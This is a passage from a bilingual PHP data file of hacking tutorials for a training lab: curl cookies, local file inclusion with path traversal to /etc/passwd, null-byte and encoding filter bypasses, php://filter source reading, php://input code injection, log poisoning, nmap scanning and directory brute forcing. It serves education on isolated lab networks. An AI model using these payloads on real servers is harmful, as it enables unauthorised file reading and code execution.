    'category' => 'HTTP',
    'id' => 'HTTPFormCookies',
    'title' => 'Curl: Sauver et modifier des cookies',
    'desc' => '## Curl: Sauver et modifier des cookies

Les cookies servent à stocker des valeurs sur le navigateur qui seront reutilisées entre deux sessions.<br/>
Ils peuvent contenir des choix de langue, couleurs, et parfois d\'authentification...<br/>
<br/>
Lire les cookies envoyés par le serveur et les stocker dans un cookie jar.
```
$ curl  -c cookies.txt http://10.10.1.11/cookies.php
```


Envoyer un cookie sauvegardé, et sauver la nouvelle valeur
```
$ curl -b cookies.txt -c cookies.txt http://10.10.1.11/cookies.php
```


Envoyer un cookie manuellement
```
$ curl -b \'code=1447\' http://10.10.1.11/cookies.php
```



',
    'title_en' => 'Curl: Store and modify cookies',
    'desc_en' => '## Curl: Store and modify cookies

Cookies are used to store data on the browser, that will be reused at the next session.<br/>
They can contain everything: choices of language, colors, and sometimes password...<br/>
<br/>
Read cookies in the server response and store them in a cookie jar.
```
$ curl  -c cookies.txt http://10.10.1.11/cookies.php
```


Send a stored cookie, and update its value with the response
```
$ curl -b cookies.txt -c cookies.txt http://10.10.1.11/cookies.php
```


Send a manually crafted cookie
```
$ curl -b \'code=1447\' http://10.10.1.11/cookies.php
```



',
  ),
  'lfi-intro' => 
  array (
    'category' => 'lfi',
    'id' => 'intro',
    'title' => 'Inclusion de Fichier Local (LFI)',
    'desc' => '## Inclusion de Fichier Local (LFI)


',
    'title_en' => 'Local File Inclusion (LFI)',
    'desc_en' => '## Local File Inclusion (LFI)


',
  ),
  'lfi-LFI' => 
  array (
    'category' => 'lfi',
    'id' => 'LFI',
    'title' => 'LFI',
    'desc' => '## LFI

De nombreux langages de programmations, comme le php, sont capable de lire des fichiers et les interpréter pour générer des pages HTML dynamiques.<br/>
Cette fonction peut être détournée si elle prend en entrée une variable modifiable par l\'utilisateur.<br/>
<br/>
Par exemple:<br/>
L\'url http://10.10.10.11/index.php?page=login.php est envoyée au serveur.<br/>
A la réception de cette requête, le serveur va inclure le fichier \'login.php\', et l\'éxécuter pour générer la page de login.<br/>
<br/>
Nous allons remplacer \'login.php\' par le nom d\'un autre fichier, par exemple \'/etc/passwd\'.<br/>

```
http://10.10.10.11/index.php?page=/etc/passwd
```

',
    'title_en' => 'LFI',
    'desc_en' => '## LFI

Many programming languages, such as php, are able to read files and process them to generate dynamic HTML pages.<br/>
This feature can be hijacked by user crafted variable.<br/>
<br/>
For exemple:<br/>
The URI http://10.10.10.11/index.php?page=login.php is sent to the server.
The server receive the request extract the page field \'login.php\' and process this file to generate the HTML login page.

Let replace \'login.php\' by another file such as \'/etc/passwd\', that will be processed by php.
```
http://10.10.10.11/index.php?page=/etc/passwd
```
Php commands are enclosed between &lt;?php and ?> tags. When parsing a file without those tags, php simply print the file content.

',
  ),
  'lfi-FLI..' => 
  array (
    'category' => 'lfi',
    'id' => 'FLI..',
    'title' => 'LFI: Accéder à /',
    'desc' => '## LFI: Accéder à /

Le serveur web apache fonctionne généralement dans le répertoire /var/www/html.<br/>
Si nous précisons page=/etc/passwd, le serveur risque de chercher le fichier /var/www/html/etc/passwd. <br/>
Nous utilisons alors /../ pour remonter d\'un répertoire.<br/>

```
/var/www/html/../etc/passwd => /var/www/etc/passwd.
/var/www/html/../../etc/passwd => /var/etc/passwd.
```


Nous utilisons une série de ../../../../../ devant le nom du fichier pour forcer le serveur à redescendre au niveau de la racine des répertoires.<br/>
/var/www/html/../../../../../../../ vaut /, quel que soit le nombre de ../<br/>


```
http://10.10.10.11?page=../../../../../etc/passwd
```

Une LFI permet de lire TOUS les fichiers de la machine accessible au compte du serveur web.

',
    'title_en' => 'LFI: Access /',
    'desc_en' => '## LFI: Access /

Apache web server working directory is usually /var/www/html.<br/>
Setting page=/etc/passwd, the server tries to open the file /var/www/html/etc/passwd. <br/>
Let add /../ to the path to reach the upper directory.<br/>

```
/var/www/html/../etc/passwd => /var/www/etc/passwd.
/var/www/html/../../etc/passwd => /var/etc/passwd.
```

We can add as many  ../../../../../ as we want, we can\'t go upper than /.<br/>
/var/www/html/../../../../../../../ => /, regardless of the number of ../<br/>

```
http://10.10.10.11?page=../../../../../etc/passwd
```

An LFI can read/execute ALL files, the web server account is allowed to read.

',
  ),
  'lfi-LFINull' => 
  array (
    'category' => 'lfi',
    'id' => 'LFINull',
    'title' => 'NUll byte',
    'desc' => '## NUll byte

Le serveur extrait le paramètre \'page\' de la requète http://10.10.10.11/index.php?page=login, et ajoute l\'extension \'.php\' avant d\'inclure le fichier.<br/>
<br/>
http://10.10.10.11/index.php?page=/etc/password va essayer d\'ouvrir sans success /etc/password.php.<br/>
<br/>
Sur les version de php antérieures à 5.3.4, l\'ajout d\'un null byte à la fin de notre paramètre va signifier la fin de la chaine de caractère, et conduit à ignorer l\'extension \'.php\'.<br/>
```
http://10.10.10.11/index.php?page=/etc/password%00
```



',
    'title_en' => 'NUll byte',
    'desc_en' => '## NUll byte

The server extracts \'page\' parameter from request http://10.10.10.11/index.php?page=login, and appends an extension such as \'.php\' before including it.<br/>
<br/>
http://10.10.10.11/index.php?page=/etc/password tries without succes to open /etc/password.php.<br/>
<br/>
On php version older than 5.3.4, adding a null byte at the end of our parameter will mean the end of the string, and leads to ignoring the extension \'.php\'.<br/>
```
http://10.10.10.11/index.php?page=/etc/password%00
```


',
  ),
  'lfi-LFIURLDoubleEncodage' => 
  array (
    'category' => 'lfi',
    'id' => 'LFIURLDoubleEncodage',
    'title' => 'Double encodage d\'URL',
    'desc' => '## Double encodage d\'URL

```
<   %3C %253C
>   %3E %253E
«   %22 %2522
‘   %27 %2527
/   %2F %252F
.   %2E %252E
=   %3D %253D
–   %2D %252D
:   %3A %253A
```

',
    'title_en' => 'URL double encoding',
    'desc_en' => '## URL double encoding

```
<   %3C %253C
>   %3E %253E
«   %22 %2522
‘   %27 %2527
/   %2F %252F
.   %2E %252E
=   %3D %253D
–   %2D %252D
:   %3A %253A
```

',
  ),
  'lfi-LFIWaf' => 
  array (
    'category' => 'lfi',
    'id' => 'LFIWaf',
    'title' => 'WAF: Filtres applicatifs',
    'desc' => '## WAF: Filtres applicatifs

Les développeurs ayant conscience des risques de LFI peuvent ajouter des fonctions qui vont filtrer les entrées.<br/>
Ils vont supprimer les ../ et les / dans le nom du fichier<br/>
Ce genre de filtre s\'appelle un Waf : Web Application Filter.<br/>
<br/>
Il est possible de contourner ces filtres de plusieures manières:<br/>
- En prévoyant que des suites de caractères seront filtrés: ..././ une fois filtré va donner ../<br/>
http://10.10.10.11/index.php?page=..././..././..././..././passwd<br/>
<br/>
- En utilisant un encodage url:<br/>
../ devient %2e%2e%2f<br/>
/ devient %2f<br/>
http://10.10.10.11/index.php?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd<br/>
<br/>
- En utilisant un double encodage url:<br/>
../ devient %2e%2e%2f qui lui même devient %252e%252e%252f<br/>
/ devient %252f<br/>
http://10.10.10.11/index.php?page=%252e%252e%252f%252e%252e%252fetc%252fpassword<br/>
<br/>
Même si généralement les navigateurs ne ralent pas trop, ils peuvent interpréter les caractères encodés voire les réencoder. Il est souvent préférable de modifier l\'URL dans une command curl ou un proxy plutôt que dans le navigateur.

',
    'title_en' => 'WAF: Web Application Filter',
    'desc_en' => '## WAF: Web Application Filter

Developers, who are aware of the risks of LFI, sometime add functions that will filter the entries.<br/>
They detect and remove the ../ and the / in the filename<br/>.
This kind of filter is called a Waf: Web Application Filter.<br/>
<br/>
It is possible to bypass these filters in several ways:<br/>
- By providing the sequences of characters that will be filtered out: ..././ once filtered becomes ../<br/>
http://10.10.10.11/index.php?page=..././..././..././..././passwd<br/>
<br/>
- Using url encoding:<br/>
%2e%2e%2f instead of ../<br/>
%2f instead of /<br/>
http://10.10.10.11/index.php?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd<br/>
<br/>
- Using a double url encoding:<br/>
../ => %2e%2e%2f => %252e%252e%252f<br/>
http://10.10.10.11/index.php?page=%252e%252e%252f%252e%252e%252fetc%252fpassword<br/>
<br/>

Browsers could interpret the encoded characters or even re-encode them. It is usually better to set the desired URL thanks to a curl command or modify/replay using an HTTP proxy.

',
  ),
  'lfi-LFIphpfilter' => 
  array (
    'category' => 'lfi',
    'id' => 'LFIphpfilter',
    'title' => 'Php:filter : Recupérer les codes sources php',
    'desc' => '## Php:filter : Recupérer les codes sources php

Le langage php offre la possibilité de passer les fichiers dans des filtres avant de les ouvrir. Il est ainsi possible d\'encoder un fichier en base64 avant de l\'ouvrir.
````
http://10.10.10.11/index.php?page=php://filter/read=convert.base64-encode/resource=login.php
http://10.10.10.11/index.php?page=php://filter/convert.base64-encode/resource=login.php
````
Il ne reste plus qu\'à décoder pour obtenir le code source du fichier php.

',
    'title_en' => 'Php:filter: Get php sources',
    'desc_en' => '## Php:filter: Get php sources

Php allows to pass files through filters before opening them. It is thus possible to encode a file in base64 before opening it.
````
http://10.10.10.11/index.php?page=php://filter/read=convert.base64-encode/resource=login.php
http://10.10.10.11/index.php?page=php://filter/convert.base64-encode/resource=login.php
````
It only remains to decode base64 to get the source code of the file.

',
  ),
  'lfi-LFIphpinput' => 
  array (
    'category' => 'lfi',
    'id' => 'LFIphpinput',
    'title' => 'Php:input : Injecter du code via un Post HTTP',
    'desc' => '## Php:input : Injecter du code via un Post HTTP

Le langage php permet de traiter le contenu de la requête HTTP comme un fichier. Il est ainsi possible de lire et faire executer le contenu brut des données en POST avec php://input.<br/>

curl  -X POST -d \'test=&lt;? system (&quot;id&quot;); ?>\' http://pwnlab/?page=php://input<br/>
<br/>
Ne fonctionne que si l\'option allow_url_include = On est active dans la config php. Cette option est désactivée par défaut.

',
    'title_en' => 'Php:input : Code injection in an HTTP Post',
    'desc_en' => '## Php:input : Code injection in an HTTP Post

Php allows to read the content of the HTTP request as a file. It is thus possible to read and execute the raw content of the data in POST with php://input.<br/>

curl  -X POST -d \'test=&lt;? system (&quot;id&quot;); ?>\' http://pwnlab/?page=php://input<br/>

Only works if the option allow_url_include = On is active in the php config. This option is disabled by default.

',
  ),
  'lfi-FLILog' => 
  array (
    'category' => 'lfi',
    'id' => 'FLILog',
    'title' => 'Exploitation des logs',
    'desc' => '## Exploitation des logs

Pour injecter une payload Php dans le fichier de logs d\'un serveur web, il suffit de faire une requête de type HTTP GET contenant du code php dans l\'url.<br/>
Pour un serveur ftp ou ssh, injecter la payload dans le login.
Nous utilisons ensuite une LFI sur le fichier de log pour déclencher l\'execution de la payload.<br/>
<br/>
Fichiers de logs usuels:<br/>
Apache<br/>
/var/log/apache/access.log<br/>
/var/log/apache/error.log<br/>
/usr/local/apache/log/error_log<br/>
/usr/local/apache2/log/error_log<br/>
/var/log/httpd/error_log<br/>
<br/>
Nginx<br/>
/var/log/nginx/access.log<br/>
/var/log/nginx/error.log<br/>
<br/>
Ssh<br/>
/var/log/sshd.log<br/>
<br/>
Il est possible de vérifier l\'emplacement des fichiers de logs en lisant les fichiers de config.<br/>
Fichier de config de Nginx: /etc/nginx/nginx.conf<br/>
Entrée du fichier de config : access_log /spool/logs/nginx-access.log<br/>


',
    'title_en' => 'Logs Exploitation',
    'desc_en' => '## Logs Exploitation

To inject a Php payload in the log file of a server, just send an HTTP GET request containing php code in the url.<br/>
For an ssh or ftp server, inject the payload in login.
Use then an LFI on the log file to trigger the payload.<br/>
<br/>
Usual log files locations:<br/>
Apache<br/>
/var/log/apache/access.log<br/>
/var/log/apache/error.log<br/>
/usr/local/apache/log/error_log<br/>
/usr/local/apache2/log/error_log<br/>
/var/log/httpd/error_log<br/>
<br/>
Nginx<br/>
/var/log/nginx/access.log<br/>
/var/log/nginx/error.log<br/>
<br/>
Ssh<br/>
/var/log/sshd.log<br/>
<br/>
Log files location can be found in webservers config files:<br/>
Nginx: /etc/nginx/nginx.conf<br/>
Look for : access_log /spool/logs/nginx-access.log<br/>


',
  ),
  'Network-intro' => 
  array (
    'category' => 'Network',
    'id' => 'intro',
    'title' => 'Network',
    'desc' => '## Network

Vous venez de vous connecter à un réseau.

Récupérez l\'adresse IP que le routeur à attribué à votre machine.
Scanner le réseau pour connaitre les adresses IP des serveurs qui y sont connectés.
Ensuite scannez chaque machine pour déterminer les ports ouverts, et identifier services qui tournent dessus.
Si possible lire les bannières de connection, et en extraire les noms et versions des services.
Vérifier si des failles existent pour cette version des services.

',
    'title_en' => 'Network',
    'desc_en' => '## Network

You just connected to a new network.

Get the IP address the router just gave you.
Scan the network to identify all active hosts IPs.
Then scan each host to list open ports and determine which services are running on it.
When possible read services banners and identify the version number of the services.
Look for possible known exploits for service/version pairs.

',
  ),
  'Network-ip' => 
  array (
    'category' => 'Network',
    'id' => 'ip',
    'title' => 'IP : Internet Protocol',
    'desc' => '## IP : Internet Protocol

Une adresse IP (avec IP pour Internet Protocol) est un identifiant, qui est attribuée, de façon permanente ou provisoire, à chaque machine relié à un réseau informatique (PC, téléphone, smart TV, objet connecté,...).

Les adresses IPv4 (version 4) sont codées sur 32 bits. Elles sont généralement représentées en notation décimale avec quatre nombres compris entre 0 et 255, séparés par des points.
Exemple : 172.16.254.1


Un serveur possède autant d\'adresses que de cartes réseaux.
Certaines adresses ont une utilisation réservée:
- 127.0.0.1, appelée <i>loopback</i> désigne notre serveur.
- 0.0.0.0, désigne l\'ensemble des adresses IP de notre serveur.

<br/>
_Sous-réseau_
Les premiers bits de l\'adresse IP précisent le numéro du réseau, les suivants le numéro de l\'hôte.
Le nombre de bits du réseau est précisé par le masque de réseau:
- 10.10.10.12/16 => Réseau 10.10.x.x, il y a 65535 machines adressables sur ce réseau.
- 10.10.10.12/24 => Réseau 10.10.10.x, il y a 128 machines adressables sur ce réseau.

Quand nous scannons 10.10.10.1/24, nous testons toutes les adresses de 10.10.10.1 à 10.10.10.255

<br/>
_192.168.X.X/16, 172.16.0.0/12 et 10.X.X.X/8_

Les adresses 192.168.X.X/16, 172.16.0.0/12 et 10.X.X.X/8 sont réservées pour les réseaux locaux.
Vous ne devez pratiquer de scans et des exploits que sur des machines joignables sur ces plages d\'adresses.



<a href=\'https://fr.wikipedia.org/wiki/Adresse_IP\'>Article sur Wikipedia: https://fr.wikipedia.org/wiki/Adresse_IP</a>

',
    'title_en' => 'IP : Internet Protocol',
    'desc_en' => '## IP : Internet Protocol

An IP address (with IP for Internet Protocol) is an identifier, which is assigned, permanently or temporarily, to each machine connected to a computer network (PC, telephone, smart TV, connected object, ...).

IPv4 (version 4) addresses are 32-bit coded. They are generally represented in decimal notation with four numbers between 0 and 255, separated by dots.
Example: 172.16.254.1

A server has as many addresses as there are network cards. Some addresses have a reserved use:
- 127.0.0.1, called <i>loopback</i> designates our server.
- 0.0.0.0.0, designates all the IP addresses of our server.

<br/>
_Subnetwork_

The first bits of the IP address specify the network number, the next bits the host number.
The number of bits in the network is specified by the network mask:
- 10.10.10.12/16 => Network 10.10.x.x, there are 65535 addressable machines on this network.
- 10.10.10.12/24 => Network 10.10.10.x, there are 128 addressable machines on this network.

When we scan 10.10.10.1/24, we test all addresses from 10.10.10.1 to 10.10.10.255.

<br/>
_192.168.X.X/16, 172.16.0.0/12 and 10.X.X.X/8_

The 192.168.X.X/16, 172.16.0.0/12 and 10.X.X.X/8 networks are dedicated to local networks.
Such adresses should never be forwarded by routers or boxes to Internet.
You must train scans and exploits ONLY on hosts on those networks.

<a href=\'https://en.wikipedia.org/wiki/IP_address\'>Wikipedia: https://en.wikipedia.org/wiki/IP_address</a>

',
  ),
  'Network-NetIpAddr' => 
  array (
    'category' => 'Network',
    'id' => 'NetIpAddr',
    'title' => 'Trouver mon IP avec \'ip addr\'',
    'desc' => '## Trouver mon IP avec \'ip addr\'

```

$ ip addr

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
inet 127.0.0.1/8 scope host lo
valid_lft forever preferred_lft forever
73: eth1@if74: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
link/ether 02:42:0a:0a:0a:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0
inet <span  style=\'color:Cyan;\'>10.10.10.3/24</span > brd 10.10.10.255 scope global eth1
valid_lft forever preferred_lft forever
```


',
    'title_en' => 'Know your IP adress thanks to \'ip addr\'',
    'desc_en' => '## Know your IP adress thanks to \'ip addr\'

```

$ ip addr

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
inet 127.0.0.1/8 scope host lo
valid_lft forever preferred_lft forever
73: eth1@if74: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
link/ether 02:42:0a:0a:0a:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0
inet <span  style=\'color:Cyan;\'>10.10.10.3/24</span > brd 10.10.10.255 scope global eth1
valid_lft forever preferred_lft forever
```


',
  ),
  'Network-NetIfconfig' => 
  array (
    'category' => 'Network',
    'id' => 'NetIfconfig',
    'title' => 'Trouver mon IP avec \'ifconfig\'',
    'desc' => '## Trouver mon IP avec \'ifconfig\'

```

$ ifconfig

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
inet 10.10.0.2  netmask 255.255.255.0  broadcast 10.10.0.255
ether 02:42:0a:0a:00:02  txqueuelen 0  (Ethernet)
RX packets 7567  bytes 573298 (559.8 KiB)
RX errors 0  dropped 0  overruns 0  frame 0
TX packets 7073  bytes 4046236 (3.8 MiB)
TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
inet <span style=\'color:Cyan;\'>10.10.10.3</span>  netmask <span style=\'color:Cyan;\'>255.255.255.0</span>  broadcast 10.10.10.255
ether 02:42:0a:0a:0a:03  txqueuelen 0  (Ethernet)
RX packets 15569  bytes 2618290 (2.4 MiB)
RX errors 0  dropped 0  overruns 0  frame 0
TX packets 20985  bytes 1976399 (1.8 MiB)
TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```



',
    'title_en' => 'Know your IP adress thanks to \'ifconfig\'',
    'desc_en' => '## Know your IP adress thanks to \'ifconfig\'

```

$ ifconfig

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
inet 10.10.0.2  netmask 255.255.255.0  broadcast 10.10.0.255
ether 02:42:0a:0a:00:02  txqueuelen 0  (Ethernet)
RX packets 7567  bytes 573298 (559.8 KiB)
RX errors 0  dropped 0  overruns 0  frame 0
TX packets 7073  bytes 4046236 (3.8 MiB)
TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
inet <span style=\'color:Cyan;\'>10.10.10.3</span>  netmask <span style=\'color:Cyan;\'>255.255.255.0</span>  broadcast 10.10.10.255
ether 02:42:0a:0a:0a:03  txqueuelen 0  (Ethernet)
RX packets 15569  bytes 2618290 (2.4 MiB)
RX errors 0  dropped 0  overruns 0  frame 0
TX packets 20985  bytes 1976399 (1.8 MiB)
TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```



',
  ),
  'NetworkDiscovery-intro' => 
  array (
    'category' => 'NetworkDiscovery',
    'id' => 'intro',
    'title' => 'Network Discovery',
    'desc' => '## Network Discovery


',
    'title_en' => 'Network Discovery',
    'desc_en' => '## Network Discovery


',
  ),
  'NetworkDiscovery-dicoverhost' => 
  array (
    'category' => 'NetworkDiscovery',
    'id' => 'dicoverhost',
    'title' => 'Network scanner: Recherche des serveurs',
    'desc' => '## Network scanner: Recherche des serveurs

Utiliser nmap pour identifier les serveurs sur le sous-réseau 10.10.10.4/24
```
# nmap 10.10.10.4/24
# nmap 10.10.10.1-255
```


',
    'title_en' => 'Discover Hosts',
    'desc_en' => '## Discover Hosts

Use nmap to identify live hosts on 10.10.10.4/24 network
```
# nmap 10.10.10.4/24
# nmap 10.10.10.1-255
```


',
  ),
  'NetworkDiscovery-portscanner' => 
  array (
    'category' => 'NetworkDiscovery',
    'id' => 'portscanner',
    'title' => 'Port scanner: Scan des ports ouverts d\'un serveur',
    'desc' => '## Port scanner: Scan des ports ouverts d\'un serveur

```
# nmap 10.10.10.4
# nmap -A  10.10.10.4          : Scan les 1000 ports les plus utilisés. Cherche les versions des services et l\'OS
# nmap -sV -sC -p- 10.10.10.4  : scan les 655535 ports TCP et cherche les versions des services ouverts.
# nmap -sU 10.10.10.4          : scan des ports UDP (trés trés lent)
-sV : Tente d\'identifier la version du service
-sC : Scanne avec les scripts NMap par défaut. Les scripts considérés comme sans risque.
-A  : Tente de détecter la version de l\'OS, la version des services, utilise les scripts par défaut, et réalise un traceroute
-p- : Scanne les 65535 ports TCP
-sU : Scanne les ports UDP (trés long)
-oN nmap.log : output file
```

On peut lancer ces trois commandes dans trois shells en parallèle.

',
    'title_en' => 'Port scanner',
    'desc_en' => '## Port scanner

```
# nmap 10.10.10.4
# nmap -A  10.10.10.4          : Scan Top 1000 ports et get services versions
# nmap -sV -sC -p- 10.10.10.4  : Scan all 65535 TCP ports
# nmap -sU 10.10.10.4          : Scan UDP ports
-sV : Attempts to determine the version of the service running on port
-sC : Scan with default NSE scripts. Considered useful for discovery and safe
-A  : Enables OS detection, version detection, script scanning, and traceroute
-p- : Port scan all ports
-sU : UDP ports (very slow)
-oN nmap.log : output file
```

The three scripts can be launch in parallel in three different xterms.

',
  ),
  'NetworkDiscovery-portidentification' => 
  array (
    'category' => 'NetworkDiscovery',
    'id' => 'portidentification',
    'title' => 'Identification des services',
    'desc' => '## Identification des services

Les services de type ftp, web, ldap tournent peuvent fonctionner sur n\'importe quel port, mais utilisent généralement les ports qui leur sont réservés.
Le port 80 par exemple est le port utilisé par les serveurs web pour HTTP.
Le port 443 est le port pour HTTPS.
```
TCP
20: ftp data
21: ftp control
22: ssh
23: telnet
25: SMTP (mail)
37: Time protocol
53: Bind/DNS
69: TFTP (Trivial FTP)
80: HTTP
109: POP2
110: POP3
111: RPC Remote Procedure Call
137: Netbios Name Service
138: Netbios Datagram Service
139: Netbios Session Service
143: IMAP (mail)
161: SNMP
220: IMAP
389: LDAP
443: HTTPS
445: MS Active Directory, SMB
464: Kerberos
1521: Oracle Database
3000: Node JS
3306: MySQL
UDP
69: TFTP
161: SNMP

http://www.0daysecurity.com/penetration-testing/enumeration.html
```


',
    'title_en' => 'Ports identification',
    'desc_en' => '## Ports identification

Despite they can run on any port, services such as ftp, web, or ldap generally use the ports reserved for them.
Port 80 for example is used by web servers for HTTP.
Port 443 is the port for HTTPS.
```
TCP
20: ftp data
21: ftp control
22: ssh
23: telnet
25: SMTP (mail)
37: Time protocol
53: Bind/DNS
69: TFTP (Trivial FTP)
80: HTTP
109: POP2
110: POP3
111: RPC Remote Procedure Call
137: Netbios Name Service
138: Netbios Datagram Service
139: Netbios Session Service
143: IMAP (mail)
161: SNMP
220: IMAP
389: LDAP
443: HTTPS
445: MS Active Directory, SMB
464: Kerberos
1521: Oracle Database
3000: Node JS
3306: MySQL
UDP
69: TFTP
161: SNMP

http://www.0daysecurity.com/penetration-testing/enumeration.html
```


',
  ),
  'NetworkDiscovery-21FtpAnonymous' => 
  array (
    'category' => 'NetworkDiscovery',
    'id' => '21FtpAnonymous',
    'title' => '21: FTP - Anonymous',
    'desc' => '## 21: FTP - Anonymous

Les serveurs ftp permettent de transférer des fichiers.
Une fois connecté avec un login/password, il est possible de se déplacer dans l\'arborescence des répertoire pour  d\'uploader/downloader des fichiers.
Par défaut, le protocole est optimisé pour les fichiers textes. Ne pas oublier d\'activer le mode binaire si nécessaire.
Un compte invité, ou anonymous permet sur certain serveur de télécharger librement des documents publics.
Le login est \'anonymous\', le mot de passe est par convention le mail de l\'invité.
```
$ ftp 10.0.0.11
Name (10.0.0.11:yolo): anonymous
Password: yolo@yolospacehacker.com
ftp> pwd
ftp> cd docs
ftp> ls
ftp> bin
ftp> get flag.txt
ftp> put backdoor.php
ftp> bye
```


',
    'title_en' => '21: FTP - Anonymous',
    'desc_en' => '## 21: FTP - Anonymous

Ftp servers are used to transfer files.
Once logged in with a login/password, it is possible to move through the directory tree to upload/download files.
By default, the protocol is optimised for text files. Do not forget to activate the binary mode if necessary.
A guest or anonymous account allows on certain servers to freely download public documents.
The login is \'anonymous\', the password is conventionally the guest\'s email.
```
$ ftp 10.0.0.11
Name (10.0.0.11:yolo): anonymous
Password: yolo@yolospacehacker.com
ftp> pwd
ftp> cd docs
ftp> ls
ftp> bin
ftp> get flag.txt
ftp> put backdoor.php
ftp> bye
```


',
  ),
  'NetworkDiscovery-22Ssh' => 
  array (
    'category' => 'NetworkDiscovery',
    'id' => '22Ssh',
    'title' => '22: Ssh',
    'desc' => '## 22: Ssh

Le port 22 est le port ssh, qui permet l\'accès distant à un terminal.
Il est possible de se connecter avec un login/password.
```
$ ssh yolo@10.0.0.11
```


Il est aussi possible de se connecter avec un fichier de clef privé.
```
$ ssh -i id_rsa yolo@10.0.0.11
```

Le fichier de clef privée ne doit être en lecture que par son propriétaire.
```
$ chmod 600 id_rsa
```


',
    'title_en' => '22: Ssh',
    'desc_en' => '## 22: Ssh

22 is the ssh port, which allows remote access to a terminal.
It is possible to connect with a login/password.
```
$ ssh yolo@10.0.0.11
```


It is also possible to log in with a private key file.
```
$ ssh -i id_rsa yolo@10.0.0.11
```

The private key file should only be read by its owner.
```
$ chmod 600 id_rsa
```


',
  ),
  'NetworkDiscovery-80HTTProbots' => 
  array (
    'category' => 'NetworkDiscovery',
    'id' => '80HTTProbots',
    'title' => '80: HTTP - Robots.txt',
    'desc' => '## 80: HTTP - Robots.txt

Le fichier robots.txt, quand il existe, est enregistré à la racine d\'un site web.
Il contient une liste des ressources du site qui ne sont pas censées être indexées par les robots d\'indexation des moteurs de recherche.<br/>
Par convention, les robots consultent robots.txt avant d\'indexer un site Web.<br/>
Son contenu peut donc nous interresser.
```
http://10.10.10.8/robots.txt
```

Plus d\'info : <a href=\'https://fr.wikipedia.org/wiki/Protocole_d%27exclusion_des_robots\'>https://fr.wikipedia.org/wiki/Protocole_d%27exclusion_des_robots</a>

',
    'title_en' => '80: HTTP - Robots.txt',
    'desc_en' => '## 80: HTTP - Robots.txt

The robots.txt file, when it exists, is stored at the root of a website.
It contains a list of the resources of the site that are not supposed to be indexed by search engine spiders.<br/>
By convention, robots read robots.txt before indexing a website.<br/>
Its content may therefore be of interest to us.```
http://10.10.10.8/robots.txt
```

Plus d\'info : <a href=\'https://en.wikipedia.org/wiki/Robots_exclusion_standard\'>https://en.wikipedia.org/wiki/Robots_exclusion_standard</a>

',
  ),
  'NetworkDiscovery-80HTTPsrc' => 
  array (
    'category' => 'NetworkDiscovery',
    'id' => '80HTTPsrc',
    'title' => '80: HTTP - Page source',
    'desc' => '## 80: HTTP - Page source

Les développeurs laissent parfois des informations utiles, voire des mots de passe dans les commentaires du code. Ce sont souvent des urls,ou des champs de formulaires utilisés pour les tests.<br/><br/>
<div>Commentaires dans le code source HTML ou JS de la page</div>
```
/* Secret code */
&lt;!--- Secret code ---&gt;
```


<div>Elements HTML cachés</div>
```
&lt;p hidden&gt;Secret code.&lt;/p&gt;
&lt;label style=&apos;display: none&apos;&gt;Secret code.&lt;/label&gt;
```


',
    'title_en' => '80: HTTP - Page source',
    'desc_en' => '## 80: HTTP - Page source

Developers sometimes leave useful information or even passwords in code comments. These are often urls, or form fields used for testing.<br/><br/>
<div>Comments in the HTML or JS source code of the pagee</div>
```
/* Secret code */
&lt;!--- Secret code ---&gt;
```


<div>Hidden HTML elements</div>
```
&lt;p hidden&gt;Secret code.&lt;/p&gt;
&lt;label style=&apos;display: none&apos;&gt;Secret code.&lt;/label&gt;
```


',
  ),
  'NetworkDiscovery-80HTTPdirs' => 
  array (
    'category' => 'NetworkDiscovery',
    'id' => '80HTTPdirs',
    'title' => '80: HTTP - Brute force de fichiers et répertoires',
    'desc' => '## 80: HTTP - Brute force de fichiers et répertoires

Bruteforcer un site web consiste à tester la présence de pages accessibles, telles /register, /register.php, /admin, /upload, /users/login.txt, /admin/password.sav, ...
Pour celà il existe des listes de répertoires et de noms de fichiers fréquemment présents sur les serveurs web.<br/>
<br/>
Une fois la techno du serveur connue (php, java, wordpress, joomla, ...) il est possible d\'utiliser des listes optimisées, et ne chercher que les extensions adaptées: php, php4, php5, exe, jsp, ...<br/>
Il est aussi possible de chercher des fichiers aux extensions intéressantes : cfg, txt, sav, jar, zip, sh, ...

<br/>
Logiciels de brute force usuels :
<ul>
<li>dirb : Ligne de commande. A utiliser pour un check rapide avec sa liste \'common.txt\'.</li>
<li>gobuster : Ligne de commande. A utiliser avec la liste \'directory-list-2.3-medium.txt\' de dirbuster</li>
<li>dirbuster : Interface graphique. Visuel mais pas forcément le meilleur choix</li>
</ul>

Il est crucial de bien choisir la liste de répertoires/noms de fichiers:
<ul>
<li>/usr/share/wordlists/dirb/common.txt : petite liste bien construite</li>
<li>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt : grosse liste. Normalement couvre tous les CTF.</li>
<li>https://github.com/danielmiessler/SecLists : Une fois à l\'aise avec les deux listes précédentes, il est possible de trouver des listes plus optimisées sur ce git.
<li>Sur les distribution Kali et Parrot, le répertoire /usr/share/wordlists contient des liens vers de nombreuses listes. Prenez le temps de le regarder en détail.</li>
</ul>
<br/>

<h5>Dirb</h5>
Dirb est préinstallé sur Kali ou Parrot. Si ce n\'est pas le cas:
```
sudo apt-get install -y dirb
```

Lancer un scan rapide avec dirb, qui va utiliser sa liste \'common.txt\':
```
dirb http://10.10.10.11
```

<br/>
Rechercher les fichiers avec l\'extension .php:
```
